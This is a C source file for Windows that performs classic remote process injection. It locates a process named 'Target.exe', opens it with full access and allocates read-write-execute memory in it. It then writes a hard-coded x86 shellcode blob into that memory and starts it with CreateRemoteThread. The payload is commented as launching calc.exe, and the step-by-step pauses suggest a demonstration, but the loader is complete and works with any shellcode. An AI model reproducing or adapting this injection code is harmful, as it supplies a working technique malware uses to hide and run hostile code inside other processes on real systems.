#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>

// Retrieves PID of process using API calls CreateToolhelp32Snapshot & Process32First & Process32Next
DWORD GetProcessIdByName(LPWSTR name)
{
	PROCESSENTRY32 pe32;
	HANDLE snapshot = NULL;
	DWORD pid = 0;

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(snapshot, &pe32))
		{
			do
			{
				if (!lstrcmp(pe32.szExeFile, name))
				{
					pid = pe32.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &pe32));
		}
		CloseHandle(snapshot);
	}
	return pid;
}

int main()
{
	// A variable containing the PID of the target process

	DWORD PID = GetProcessIdByName(L"Target.exe");

	// Shellcode = Kernel32.CreateProcessA "calc.exe"
	char *ShellCode = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7";

	// handle to the specified process.
	printf("Getting handle to process");
	getchar();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);
	printf("0x%d \n", hProcess);


	// Allocate memory for the shellcode in the target process
	// length of the shellcode + null terminator
	LPVOID pValloc = VirtualAllocEx(hProcess, 0, strlen(ShellCode) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	printf("Memory create on: %p \n", pValloc);
	getchar();

	// Write the shellcode inside the memory which allocated before
	WriteProcessMemory(hProcess, pValloc, ShellCode, strlen(ShellCode) + 1, 0);
	printf("Write SHELLCODE at: %p \n", pValloc);
	getchar();

	// Create a remote thread in the target process and execute the Shellcode
	HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)pValloc, 0, 0, 0);
	printf("Create a remote thread: %p \n", pValloc);
	getchar();

	return 0;
}